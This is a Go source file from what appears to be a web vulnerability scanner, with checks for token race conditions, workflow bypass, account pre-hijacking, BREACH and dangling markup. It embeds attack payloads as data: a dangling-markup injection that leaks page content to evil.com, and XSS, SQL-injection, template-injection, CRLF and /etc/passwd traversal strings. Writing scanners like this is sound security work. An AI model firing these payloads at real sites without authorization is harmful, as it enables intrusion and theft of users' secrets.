package scanner

import (
	"fmt"
	"strings"
	"sync"
	"time"

	"github.com/zanicool/apex-cli/pkg/crawler"
	"github.com/zanicool/apex-cli/pkg/engine"
	"github.com/zanicool/apex-cli/pkg/oob"
)

func scanTokenRaceCondition(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	// Race condition on token generation/refresh
	tokenPaths := []string{"/api/token/refresh", "/oauth/token", "/api/auth/refresh", "/token"}
	if len(crawl.Pages) == 0 {
		return findings
	}
	baseURL := strings.Split(crawl.Pages[0].URL, "/")[0] + "//" + strings.Split(crawl.Pages[0].URL, "/")[2]
	for _, path := range tokenPaths {
		url := baseURL + path
		var wg sync.WaitGroup
		var mu sync.Mutex
		tokens := make(map[string]bool)
		for i := 0; i < 10; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				resp := http.Post(url, "application/json", `{"refresh_token":"test"}`)
				if resp.Err == nil && resp.StatusCode == 200 && strings.Contains(resp.Body, "token") {
					mu.Lock()
					tokens[resp.Body[:min(50, len(resp.Body))]] = true
					mu.Unlock()
				}
			}()
		}
		wg.Wait()
		if len(tokens) > 1 {
			findings = append(findings, Finding{Type: "Token Race Condition", Severity: "high", URL: url, Detail: fmt.Sprintf("Parallel token requests returned %d different tokens — race condition on token generation", len(tokens)), Template: "apex-token-race"})
		}
	}
	return findings
}

func scanWorkflowBypass(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	// Skip steps in multi-step workflows
	stepPaths := []struct{ skip, final string }{
		{"/checkout/step1", "/checkout/step3"},
		{"/register/verify", "/register/complete"},
		{"/payment/init", "/payment/confirm"},
		{"/onboarding/step1", "/onboarding/complete"},
	}
	if len(crawl.Pages) == 0 {
		return findings
	}
	baseURL := strings.Split(crawl.Pages[0].URL, "/")[0] + "//" + strings.Split(crawl.Pages[0].URL, "/")[2]
	for _, step := range stepPaths {
		resp := http.Get(baseURL + step.final)
		if resp.Err == nil && resp.StatusCode == 200 && len(resp.Body) > 100 && !strings.Contains(strings.ToLower(resp.Body), "redirect") && !strings.Contains(strings.ToLower(resp.Body), "unauthorized") {
			findings = append(findings, Finding{Type: "Workflow Step Bypass", Severity: "high", URL: baseURL + step.final, Detail: fmt.Sprintf("Final step accessible without completing %s", step.skip), Template: "apex-workflow-bypass"})
		}
	}
	return findings
}

func scanAccountPrehijacking(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	// Pre-hijacking: register with victim's email before they do
	registerPaths := []string{"/register", "/signup", "/api/register", "/api/auth/register"}
	if len(crawl.Pages) == 0 {
		return findings
	}
	baseURL := strings.Split(crawl.Pages[0].URL, "/")[0] + "//" + strings.Split(crawl.Pages[0].URL, "/")[2]
	for _, path := range registerPaths {
		url := baseURL + path
		// Check if registration requires email verification
		resp := http.Post(url, "application/json", `{"email":"prehijack@test.com","password":"Test123!"}`)
		if resp.Err == nil && resp.StatusCode == 200 && !strings.Contains(strings.ToLower(resp.Body), "verify") && !strings.Contains(strings.ToLower(resp.Body), "confirm") {
			findings = append(findings, Finding{Type: "Account Pre-Hijacking Risk", Severity: "medium", URL: url, Detail: "Registration succeeds without email verification — attacker can pre-register victim's email", Template: "apex-prehijack"})
		}
	}
	return findings
}

func scanServerTimingOracle(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	for _, page := range crawl.Pages[:min(5, len(crawl.Pages))] {
		resp := http.Get(page.URL)
		if resp.Err != nil {
			continue
		}
		timing := resp.Headers.Get("Server-Timing")
		if timing != "" && (strings.Contains(timing, "db") || strings.Contains(timing, "cache") || strings.Contains(timing, "app")) {
			findings = append(findings, Finding{Type: "Server-Timing Header Leaks Internal Metrics", Severity: "low", URL: page.URL, Detail: "Server-Timing: " + timing, Template: "apex-server-timing"})
		}
	}
	return findings
}

func scanCompressionOracle(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	// BREACH-style: check if responses are compressed and reflect user input
	for _, page := range crawl.Pages[:min(5, len(crawl.Pages))] {
		resp := http.Get(page.URL)
		if resp.Err != nil {
			continue
		}
		encoding := resp.Headers.Get("Content-Encoding")
		if (encoding == "gzip" || encoding == "br" || encoding == "deflate") && strings.Contains(resp.Body, "csrf") {
			findings = append(findings, Finding{Type: "BREACH/Compression Oracle Risk", Severity: "low", URL: page.URL, Detail: fmt.Sprintf("Response compressed (%s) and contains secrets (CSRF token) — BREACH attack possible", encoding), Template: "apex-breach"})
			break
		}
	}
	return findings
}

func scanDanglingMarkup(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	payload := `"><img src='https://evil.com/steal?`
	for u, params := range crawl.Params {
		for _, p := range params {
			testURL := injectParam(u, p, payload)
			resp := http.Get(testURL)
			if resp.Err == nil && strings.Contains(resp.Body, "evil.com/steal?") {
				// Check if subsequent content is captured in the src attribute
				idx := strings.Index(resp.Body, "evil.com/steal?")
				if idx > 0 && idx+50 < len(resp.Body) {
					captured := resp.Body[idx : idx+min(100, len(resp.Body)-idx)]
					if strings.Contains(captured, "token") || strings.Contains(captured, "csrf") || strings.Contains(captured, "session") {
						findings = append(findings, Finding{Type: "Dangling Markup Injection — Secret Capture", Severity: "high", URL: testURL, Param: p, Detail: "Injected markup captures subsequent page content including secrets", Template: "apex-dangling-markup"})
					}
				}
			}
		}
	}
	return findings
}

func scanEtagTracking(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	if len(crawl.Pages) == 0 {
		return findings
	}
	resp := http.Get(crawl.Pages[0].URL)
	if resp.Err != nil {
		return findings
	}
	etag := resp.Headers.Get("ETag")
	if etag != "" && len(etag) > 20 {
		findings = append(findings, Finding{Type: "ETag Tracking — Unique Identifier", Severity: "info", URL: crawl.Pages[0].URL, Detail: "Long ETag may be used for user tracking: " + etag, Template: "apex-etag"})
	}
	return findings
}

func scanMutationFuzzer(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	// Smart fuzzer: mutate existing parameter values
	mutations := []struct{ suffix, detect string }{
		{"{{7*7}}", "49"},
		{"${7*7}", "49"},
		{"<svg onload=alert(1)>", "onload=alert"},
		{"' OR '1'='1", "sql"},
		{"%0d%0aInjected:true", ""},
		{"../../../etc/passwd", "root:"},
	}
	for u, params := range crawl.Params {
		for _, p := range params {
			for _, m := range mutations {
				testURL := injectParam(u, p, m.suffix)
				resp := http.Get(testURL)
				if resp.Err == nil && m.detect != "" && strings.Contains(strings.ToLower(resp.Body), m.detect) {
					findings = append(findings, Finding{Type: "Mutation Fuzzer Hit", Severity: "high", URL: testURL, Param: p, Payload: m.suffix, Evidence: m.detect, Template: "apex-mutation-fuzz"})
					break
				}
				if resp.Err == nil && resp.Duration > 3*time.Second {
					findings = append(findings, Finding{Type: "Mutation Fuzzer — Time Delay", Severity: "medium", URL: testURL, Param: p, Payload: m.suffix, Detail: fmt.Sprintf("%.1fs delay", resp.Duration.Seconds()), Template: "apex-mutation-time"})
					break
				}
			}
		}
	}
	return findings
}
